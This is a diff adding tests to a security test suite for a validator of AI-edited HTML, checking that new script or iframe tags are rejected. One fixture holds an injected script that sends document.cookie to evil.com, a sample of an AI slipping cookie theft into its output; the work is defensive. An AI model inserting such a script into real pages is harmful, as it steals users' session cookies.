@@ -256,6 +256,64 @@ describe("validateResponse — security checks", () => {
     expect(r.reason?.toLowerCase()).toContain("javascript:");
   });
 
+  it("rejects a NEW <script> tag the AI added (count-based)", () => {
+    const oldTarget = '<button class="old">Go</button>';
+    const input = pad(
+      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body>${oldTarget}</body></html>`,
+      500,
+    );
+    // Output keeps the tailwind script (1) + adds an evil one (2 total)
+    const output = pad(
+      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body><button class="new">Go</button><script>fetch('//evil.com?c='+document.cookie)</script></body></html>`,
+      500,
+    );
+    const r = validateResponse({
+      inputSource: input,
+      outputSource: output,
+      targetOuterHtml: oldTarget,
+      kind: "html",
+    });
+    expect(r.ok).toBe(false);
+    expect(r.reason?.toLowerCase()).toContain("script");
+  });
+
+  it("ALLOWS the existing <script> count to be preserved (Tailwind config)", () => {
+    const oldTarget = '<button class="old">Go</button>';
+    const input = pad(
+      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body>${oldTarget}</body></html>`,
+      500,
+    );
+    // Output keeps exactly 1 script — no new ones added.
+    const output = pad(
+      `<html><head><script src="https://cdn.tailwindcss.com"></script></head><body><button class="new">Go</button></body></html>`,
+      500,
+    );
+    const r = validateResponse({
+      inputSource: input,
+      outputSource: output,
+      targetOuterHtml: oldTarget,
+      kind: "html",
+    });
+    expect(r.ok).toBe(true);
+  });
+
+  it("rejects a NEW <iframe> tag", () => {
+    const oldTarget = '<button class="old">Go</button>';
+    const input = pad(`<html><body>${oldTarget}</body></html>`, 500);
+    const output = pad(
+      `<html><body><button class="new">Go</button><iframe src="https://evil.com"></iframe></body></html>`,
+      500,
+    );
+    const r = validateResponse({
+      inputSource: input,
+      outputSource: output,
+      targetOuterHtml: oldTarget,
+      kind: "html",
+    });
+    expect(r.ok).toBe(false);
+    expect(r.reason?.toLowerCase()).toContain("iframe");
+  });
+
   it("allows legitimate href URLs (http, https, mailto, #anchor)", () => {
     const output = pad(
       `<html><body>
